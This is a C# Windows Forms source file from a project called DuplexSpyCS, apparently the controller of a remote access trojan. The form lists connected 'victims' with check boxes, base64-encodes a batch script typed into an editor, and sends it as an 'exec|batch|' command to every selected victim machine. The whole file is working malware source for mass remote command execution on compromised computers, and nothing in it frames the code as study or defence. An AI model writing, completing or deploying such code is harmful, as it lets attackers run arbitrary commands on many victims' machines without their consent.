using ICSharpCode.TextEditor;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmMultiRunScript : Form
    {
        private TextEditorControl editor;

        public List<clsVictim> lsVictim;
        private readonly string[] lvColumns =
        {
            "ID",
            "Result",
        };

        public frmMultiRunScript()
        {
            InitializeComponent();
        }

        void ReqExecuteScript()
        {
            string type = null;
            string script = editor.Text;
            string b64Script = clsCrypto.b64E2Str(script);

            foreach (ListViewItem item in listView1.CheckedItems)
            {
                clsVictim v = (clsVictim)item.Tag;
                v.encSend(2, 0, "exec|batch|" + b64Script);
            }
        }

        void setup()
        {
            //Add text editor control
            editor = new TextEditorControl();
            tabPage2.Controls.Add(editor);
            editor.Dock = DockStyle.Fill;

            //ListView initialization
            listView1.View = View.Details;
            listView1.CheckBoxes = true;
            foreach (string col in lvColumns)
            {
                ColumnHeader header = new ColumnHeader();
                header.Text = col;
                header.Width = 200;
                listView1.Columns.Add(header);
            }

            foreach (clsVictim victim in lsVictim)
            {
                ListViewItem item = new ListViewItem(victim.ID);
                item.Tag = victim;
                listView1.Items.Add(item);
            }

            listView1.Refresh();

            //Status label
            toolStripStatusLabel1.Text = $"Victim[{lsVictim.Count}]";
        }

        private void frmMultiRunScript_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Execute
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            ReqExecuteScript();
        }

        //Check all
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck all
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }
    }
}
